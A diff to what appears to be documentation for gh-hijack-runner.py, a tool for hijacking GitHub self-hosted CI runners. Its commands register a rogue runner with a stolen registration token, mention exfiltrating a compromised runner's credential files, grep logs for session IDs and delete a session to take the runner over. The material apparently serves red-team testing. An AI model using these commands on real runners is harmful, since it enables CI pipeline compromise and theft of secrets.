@@ -36,6 +36,8 @@ If you manage to get a registration token to register a self-hosted runner for a
 $ gh-hijack-runner.py --registration-token AOTAA3QWE1A5QB6JFECOKQDGEVOVC --url https://github.com/syncicd/CICD --labels ubuntu-latest
 ```
 
+This can be an organization or repository registration token.
+
 ### From credentials of an existing GitHub runner
 
 With arbitrary code execution on a self-hosted runner, you need to exfiltrate three files to assume the identity of the compromised runner:
@@ -61,7 +63,7 @@ root@9f8f6f1fdfa6:/actions-runner# cat _diag/* | grep -i session
 Then, you can delete the current session:
 ```sh
 $ gh-hijack-runner.py --rsa-params credentials_rsaparams.json --credentials credentials.json --runner runner.json --delete-session-id aab007e0-eedd-4c1b-96b4-a7c2c128c31a
-[+] Session aab007e0-eedd-4c1b-96b4-a7c2c128c31a.
+[+] Session aab007e0-eedd-4c1b-96b4-a7c2c128c31a deleted.
 ```
 
 Finally you can hijack this runner:
